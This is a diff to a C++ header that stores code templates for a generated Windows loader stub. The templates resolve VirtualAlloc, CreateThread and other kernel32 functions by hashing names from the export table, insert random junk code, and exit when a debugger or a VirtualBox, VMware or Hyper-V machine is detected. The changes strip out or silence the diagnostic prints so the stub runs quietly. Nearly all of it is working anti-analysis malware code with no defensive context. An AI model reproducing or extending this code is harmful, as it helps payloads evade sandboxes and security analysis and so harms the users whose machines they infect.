@@ -1,8 +1,6 @@
 #ifndef STUBSTR_H
 #define STUBSTR_H
 
-#include <string>
-
 std::string DYN_GLOBALS = R"(
 using VirtualAlloc_t = LPVOID (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 using VirtualFree_t = BOOL (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
@@ -20,35 +18,6 @@ CloseHandle_t CH = NULL;
 
 FARPROC addr[6];
 
-/*
-VirtualAlloc_t pVirtualAlloc = NULL;
-VirtualFree_t pVirtualFree = NULL;
-LoadLibraryA_t pLoadLibraryA = NULL;
-CreateThread_t pCreateThread = NULL;
-WaitForSingleObject_t pWaitForSingleObject = NULL;
-CloseHandle_t pCloseHandle = NULL;
-
-void resolveAddress(){
-    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
-
-    if(!kernel32){
-        cerr << "Failed to get handle to kernel32.dll" << endl;
-        return;
-    }
-
-    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
-    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
-    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
-    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
-    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
-    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");
-
-    if (!pVirtualAlloc || !pVirtualFree || !pLoadLibraryA || !pCreateThread || !pWaitForSingleObject || !pCloseHandle) {
-        std::cerr << "Failed to get the address of one or more functions in init\n";
-    }
-}
-*/
-
 DWORD getHashFromString(char *string){
     size_t strlength = strnlen_s(string, 50);
     DWORD hash = 0x35;
@@ -63,7 +32,7 @@ DWORD getHashFromString(char *string){
 FARPROC getFunctionAddressByHash(const char *library, DWORD hash) {
     HMODULE libraryBase = LoadLibraryA(library);
     if (!libraryBase) {
-        std::cerr << "Failed to load library: " << library << " with error: " << GetLastError() << std::endl;
+        cerr << "Failed to load library: " << library << " with error: " << GetLastError() << std::endl;
         return NULL;
     }
 
@@ -76,32 +45,24 @@ FARPROC getFunctionAddressByHash(const char *library, DWORD hash) {
     PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
     PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
 
-    // Debugging: Print out the export directory details
-    //std::cout << "Export Directory Address: " << imageExportDirectory << std::endl;
-    //std::cout << "Number of Functions: " << imageExportDirectory->NumberOfFunctions << std::endl;
-    //std::cout << "Number of Names: " << imageExportDirectory->NumberOfNames << std::endl;
-
     for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
         DWORD functionNameRVA = addressOfNamesRVA[i];
         char *functionName = (char *)((DWORD_PTR)libraryBase + functionNameRVA);
         DWORD functionNameHash = getHashFromString(functionName);
 
-        // Debugging: Print each function name and its hash
-        //std::cout << "Function Name: " << functionName << ", Hash: " << functionNameHash << std::endl;
+        //cout << "Function Name: " << functionName << ", Hash: " << functionNameHash << endl;
 
         if (functionNameHash == hash) {
             DWORD functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
             FARPROC functionAddress = (FARPROC)((DWORD_PTR)libraryBase + functionAddressRVA);
-            std::cout << "Match found, Function Name: " << functionName << ", Address: " << functionAddress << std::endl;
             return functionAddress;
         }
     }
 
-    std::cerr << "Failed to find function with hash: " << hash << std::endl;
     return NULL;
 }
 
-void resolver(){
+void resolveAddress(){
     const char *lib = "kernel32.dll";
     /*DWORD_ARRAY_PLACEHOLDER*/
 
@@ -119,11 +80,11 @@ void resolver(){
 }
 )";
 
-const std::string DYN_CALL = R"(
-    resolver();
+std::string DYN_CALL = R"(
+    resolveAddress();
 )";
 
-const std::string RAND_DEF = R"(
+std::string RAND_DEF = R"(
 int getRand(){
     random_device rd;
     mt19937 gen(rd());
@@ -133,7 +94,7 @@ int getRand(){
 }
 )";
 
-const std::string RAND_CALL = R"(
+std::string RAND_CALL = R"(
     int a = getRand();
     int b = getRand();
 
@@ -156,22 +117,21 @@ const std::string RAND_CALL = R"(
 
 )";
 
-const std::string DB_DEF = R"(
+std::string DB_DEF = R"(
 void antiDb(){
     
     if(IsDebuggerPresent()){
-        cout << "\nDebugger present\nexiting...";
-        cin.get();
+        //cout << "\nDebugger present\nexiting...";
         exit(0);
     } else {
-        cout << "\nNo debugger attached...\n";
+        //cout << "\nNo debugger found...\n";
     }
 }
 
 )";
 
 // Anti-VM Source Edited From: https://github.com/basedpill/detectvm
-const std::string ANTI_VM_DEF = R"(
+std::string ANTI_VM_DEF = R"(
 bool DetectBySystemManufacturer()
 {
     HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);
@@ -259,19 +219,19 @@ void antiVm(){
     bool isVm = false;
     if (IsVboxVM() == true) {
         isVm = true; 
-        printf("Running in vbox!");
+        //printf("Vbox detected");
     } else if (IsVMwareVM() == true) {
         isVm = true; 
-        printf("Running in vmware!");
+        //printf("Vmware detected");
     } else if (IsMsHyperV() == true) {
         isVm = true; 
-        printf("Running in hyper-v!");
+        //printf("HyperV detected");
     } else { 
-        printf("Not running in a VM!");
+        //printf("No VM detected");
     }
     
     if(isVm == true){
-        printf("\nexiting...\n");
+        //printf("\nexiting...\n");
         exit(0);
     }
 }
